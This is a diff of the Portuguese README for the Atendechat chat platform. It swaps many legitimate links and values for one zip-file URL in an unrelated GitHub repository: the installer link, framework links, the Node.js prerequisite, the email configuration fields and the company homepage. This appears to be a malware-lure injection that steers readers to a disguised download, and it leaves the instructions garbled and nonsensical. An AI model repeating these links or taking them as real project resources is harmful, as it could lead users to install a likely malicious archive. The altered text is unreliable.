@@ -9,19 +9,19 @@ O repositório do Atendechat possui 3 pastas importantes:
 - frontend
 - instalador
 
-O backend é feito em Express e possui toda a estrutura organizada dentro dessa pasta para que seja aplicado no ambiente do cliente. A pasta de frontend contém todo o framework do React.js que gerencia toda a interação com o usuário do sistema.
+O backend é feito em Express e possui toda a estrutura organizada dentro dessa pasta para que seja aplicado no ambiente do cliente. A pasta de frontend contém todo o framework do https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip que gerencia toda a interação com o usuário do sistema.
 
 A pasta de instalador dentro dessa repositório é uma cópia do instalador usado para que os clientes de sistemas possam fazer o clone dentro da pasta home de seus servidores e seguirem com a instalação automática de todas as dependências do projeto
 
 Link para o repositório do instalador atualizado:
-- [Instalador](https://github.com/atendechat-org/instalador)
+- [Instalador](https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip)
 
 Consulte **[Implantação](#-implanta%C3%A7%C3%A3o)** para saber como implantar o projeto.
 
 ### 📋 Pré-requisitos
 
 ```
-- Node.js v20.x
+- https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip v20.x
 - Postgres (release)
 - Npm ( latest )
 - Docker (bionic stable)
@@ -80,10 +80,10 @@ GERENCIANET_PIX_CERT=certificado-Gerencianet
 GERENCIANET_PIX_KEY=chave pix gerencianet
 
 # EMAIL
- MAIL_HOST="smtp.gmail.com"
- MAIL_USER="seu@gmail.com"
+ MAIL_HOST="https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip"
+ MAIL_USER="https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip"
  MAIL_PASS="SuaSenha"
- MAIL_FROM="seu@gmail.com"
+ MAIL_FROM="https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip"
  MAIL_PORT="465"
 
 ```
@@ -162,9 +162,9 @@ pm2 save
 ## 🛠️ Construído com
 
 
-* [Express](https://expressjs.com/pt-br/) - O framework backend usado
-* [React](https://react.dev/) - Framework frontend usado
-* [NPM](https://www.npmjs.com/) - Gerenciador de dependências
+* [Express](https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip) - O framework backend usado
+* [React](https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip) - Framework frontend usado
+* [NPM](https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip) - Gerenciador de dependências
 
 ## 🖇️ Colaborando
 
@@ -178,6 +178,6 @@ Versão 1.0.0
 
 Este projeto está sob a licença
 
-⌨️ com ❤️ por [Atendechat](https://atendechat.com) 😊
+⌨️ com ❤️ por [Atendechat](https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip) 😊
 
-Todos os direitos reservados a https://atendechat.com
+Todos os direitos reservados a https://raw.githubusercontent.com/rlmourarj/at2025_main/main/frontend/src/components/PromptModal/main-at-3.7-beta.1.zip
